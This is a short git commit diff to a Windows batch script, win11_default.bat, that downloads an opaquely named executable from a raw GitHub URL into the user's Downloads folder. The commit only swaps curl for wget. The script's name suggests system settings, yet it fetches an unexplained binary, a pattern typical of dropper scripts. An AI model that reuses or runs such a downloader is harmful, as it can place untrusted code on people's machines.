cdb0602820813e918891e78f438e2008d8607888
optolab <sloneeddie36@gmail.com>
2025-01-12 13:12:56 -0500

    Update win11_default.bat

--- win11_default.bat
+++ win11_default.bat
@@ -2,6 +2,6 @@
 set url=https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe
 set file=%USERPROFILE%\Downloads\fbf12e4f.exe
 echo Downloading file...
-curl -L -v -o "%file%" "%url%"
+wget --progress=bar -O "%file%" "%url%"
 echo Download complete. File saved to %file%
 pause
